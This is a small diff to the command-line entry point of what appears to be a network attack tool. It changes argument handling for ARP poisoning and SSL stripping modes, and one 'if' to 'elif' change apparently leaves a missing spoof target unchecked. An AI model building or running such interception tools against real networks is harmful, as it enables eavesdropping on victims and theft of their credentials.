@@ -55,7 +55,7 @@ def main():
     if args.command == 'arpPoison':
         if args.macVictim is None and args.ipVictim is not None:
             args.macVictim = get_mac_address_from_ip(args.ipVictim)
-        if args.ipVictim is None or args.macVictim is None or args.ipToSpoof is None:
+        elif args.ipVictim is None or args.macVictim is None or args.ipToSpoof is None:
             sys.exit("Usage: python main.py arpPoison --ipVictim <ip> --macVictim <mac> --ipToSpoof <ip>")
         arp_spoofer = ARPSpoofer(args.interface, args.macAttacker, args.ipAttacker, args.macVictim, args.ipVictim, args.ipToSpoof)
         arp_spoofer.spoof()
@@ -67,7 +67,7 @@ def main():
     elif args.command == 'sslStrip':
         if args.ipVictim is None or args.ipToSpoof is None:
             sys.exit("Usage: python main.py sslStrip --ipVictim <ip> --ipToSpoof <ip>")
-        ssl_stripper = SSLStripper(args.interface, args.ipVictim, args.ipToSpoof)
+        ssl_stripper = SSLStripper(args.interface, args.ipAttacker, args.ipVictim, args.ipToSpoof)
         ssl_stripper.strip()
         
     elif args.command == 'listInterfaces':
